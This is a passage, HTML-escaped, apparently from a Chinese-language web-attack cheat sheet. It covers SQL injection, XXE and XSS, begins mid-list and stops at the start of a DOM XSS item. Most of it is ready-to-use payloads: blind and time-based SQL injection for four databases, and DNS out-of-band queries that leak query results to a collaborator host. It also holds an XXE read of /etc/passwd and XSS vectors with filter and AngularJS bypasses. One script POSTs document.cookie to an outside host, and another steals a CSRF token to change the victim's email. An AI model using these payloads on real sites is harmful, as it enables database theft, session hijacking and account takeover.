&amp;#x27;TABLE-NAME-HERE&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;6.Oracle 中没有 LIMIT 命令，可以试着用 ROWNUM 取代下。&lt;br /&gt;
7. 可以用以下命令测试网页是否会根据返回值的 Ture or False 变换。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR (1/0) ELSE NULL END FROM dual&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST (1/0 AS INTEGER) ELSE NULL END)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SELECT IF (YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;
&lt;p&gt;后端可能接受一个 int 值，也可能接收 string，也可能接收一行，这需要自己测试判断。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取截断的字符串。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	SUBSTR (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SUBSTRING (&amp;#x27;foobar&amp;#x27;, 4, 2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;延时注入，但是后端如果异步执行 SQL，可能造成该方法失效。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle	dbms_pipe.receive_message ((&amp;#x27;a&amp;#x27;),10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft	WAITFOR DELAY &amp;#x27;0:0:10&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL	SELECT pg_sleep (10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL	SELECT SLEEP (10)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
11.DNS 查询&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle：SELECT EXTRACTVALUE (xmltype (&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://BURP-COLLABORATOR-SUBDOMAIN/&amp;quot;&amp;gt; % remote;]&amp;gt;&amp;#x27;),&amp;#x27;/l&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              FROM dual（有的版本能用，有的版本已经修复了）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              SELECT UTL_INADDR.get_host_address (&amp;#x27;BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;)（所有版本都能用，但需要权限）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft：  exec master..xp_dirtree &amp;#x27;//BURP-COLLABORATOR-SUBDOMAIN/a&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL： copy (SELECT &amp;#x27;&amp;#x27;) to program &amp;#x27;nslookup BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL： LOAD_FILE (&amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                SELECT ... INTO OUTFILE &amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&amp;#x27;（只适用于 windows 后端）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 DNS 查询带数据：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Oracle:  SELECT EXTRACTVALUE (xmltype (&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://&amp;#x27;||(SELECT YOUR-QUERY-HERE)||&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN/&amp;quot;&amp;gt; % remote;]&amp;gt;&amp;#x27;),&amp;#x27;/l&amp;#x27;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            FROM dual&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Microsoft: declare @p varchar (1024);set @p=(SELECT YOUR-QUERY-HERE);exec (&amp;#x27;master..xp_dirtree &amp;quot;//&amp;#x27;+@p+&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN/a&amp;quot;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PostgreSQL: create OR replace function f () returns void as $$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   declare c text;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   declare p text;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   begin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   SELECT into p (SELECT YOUR-QUERY-HERE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   c := &amp;#x27;copy (SELECT &amp;#x27;&amp;#x27;&amp;#x27;&amp;#x27;) to program &amp;#x27;&amp;#x27;nslookup &amp;#x27;||p||&amp;#x27;.BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;&amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   execute c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   END;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   $$ language plpgsql security definer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   SELECT f ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MySQL: SELECT YOUR-QUERY-HERE INTO OUTFILE &amp;#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&amp;#x27;（仅在 windows 有用）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以用简单的 +,- 来判断某些数字参数是否会被后台执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;当返回只能有一列而结果有多列时，可以考虑以下方法将多列拼成一列。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT username || &amp;#x27;~&amp;#x27; || password FROM users&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;一段简单的 XML payload，用来展示 xml 格式。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE xxe [ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ELEMENT name ANY &amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:/etc/passwd&amp;quot; &amp;gt;]&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h3&gt;
&lt;p&gt;0.payload 汇总。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;1&amp;quot; onerror=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert (document.cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;onmouseover=&amp;quot;alert (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;-alert (1)-&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$on.constructor (&amp;#x27;alert (1)&amp;#x27;)()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fetch (&amp;#x27;https://BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;method: &amp;#x27;POST&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mode: &amp;#x27;no-cors&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;body:document.cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var req = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.onload = handleResponse;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.open (&amp;#x27;get&amp;#x27;,&amp;#x27;/my-account&amp;#x27;,true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.send ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function handleResponse () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var token = this.responseText.match (/name=&amp;quot;csrf&amp;quot; value=&amp;quot;(\w+)&amp;quot;/)[1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var changeReq = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.open (&amp;#x27;post&amp;#x27;, &amp;#x27;/my-account/change-email&amp;#x27;, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.send (&amp;#x27;csrf=&amp;#x27;+token+&amp;#x27;&amp;amp;email=test@test.com&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;xss id=x onfocus=alert (document.cookie) tabindex=1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;animatetransform onbegin=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;accesskey=&amp;#x27;x&amp;#x27;onclick=&amp;#x27;alert (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 以下带绕过功能 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert (1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;\&amp;#x27;-alert (1)//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://foo?&amp;amp;apos;-alert (1)-&amp;amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&amp;#123;alert (1)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;a&amp;gt;&amp;lt;animate attributeName=href values=javascript:alert (1)/&amp;gt;&amp;lt;text x=20 y=20&amp;gt;Click me&amp;lt;/text&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x=x=&amp;gt;&amp;#123;throw/**/onerror=alert,1337&amp;#125;,toString=x,window+&amp;#x27;&amp;#x27;,&amp;#123;x:&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（AngularJS）：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;toString ().constructor.prototype.charAt=[].join;[1]|orderBy:toString ().constructor.fromCharCode (120,61,97,108,101,114,116,40,49,41)=1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input autofocus ng-focus=&amp;quot;$event.path|orderBy:&amp;#x27;[].constructor.from ([1],alert)&amp;#x27;&amp;quot;&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1].map (alert)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input id=x ng-focus=$event.path|orderBy:&amp;#x27;(z=alert)(document.cookie)&amp;#x27;&amp;gt;#x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;img src=&amp;#x27;//attacker-website.com?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (window.name) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	new Image ().src=&amp;#x27;subdomain//?&amp;#x27;+encodeURIComponent (window.name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		location = &amp;#x27;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert (1)&amp;lt;/script&amp;gt;&amp;amp;token=;script-src-elem &amp;#x27;unsafe-inline&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用以下代码，对使用了 innerHTML 的网页实现 DOM XSS 攻击，innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。&lt;br /&gt;
